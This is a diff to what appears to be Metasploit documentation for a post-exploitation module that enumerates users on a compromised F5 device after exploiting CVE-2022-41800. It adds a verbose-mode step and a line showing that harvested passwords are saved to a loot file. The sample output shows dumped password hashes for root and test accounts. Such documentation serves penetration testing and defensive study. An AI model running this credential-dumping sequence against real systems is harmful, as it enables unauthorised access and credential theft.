@@ -51,6 +51,8 @@ Then just use the module, set the SESSION, and run it:
 
 ```
 msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > use post/linux/gather/f5_enum_users
+msf6 post(linux/gather/f5_enum_users) > set VERBOSE true
+VERBOSE => true
 msf6 post(linux/gather/f5_enum_users) > set SESSION 1
 SESSION => 1
 msf6 post(linux/gather/f5_enum_users) > exploit
@@ -61,5 +63,6 @@ msf6 post(linux/gather/f5_enum_users) > exploit
 [+] root / $6$hWKQCz3U$QE39QIT8ILbdah.k85LMnvKqjq3IIPge3bfM9UAiaUy.leyzHwpjYqQ7jJxSwN1PiFjKB28ofVi6rvenaxh9l/
 [+] msftest / $6$lb5UKQa8$.v/xIGpI7pvP9NCQttoDG3DUFuayJIJqs/pWrDZwhVtxygzjyiyH/J4TejPEOb/6uJXzmyUd22KiwSoTbE.qP1
 [+] msftest10 / $6$SsTj4F5Q$ct0NRCUNGrAkIF7z/XSsUhF5DY1FwDgvGMxh6w09/Zm1jpu0Sj1v8LXRbEtuHlUrtaGMNGcRuU9EZYNjThEar0
+[+] Passwords stored in /home/ron/.msf4/loot/20221115101111_default_10.0.0.162_f5.passwords_439089.txt
 [*] Post module execution completed
 ```
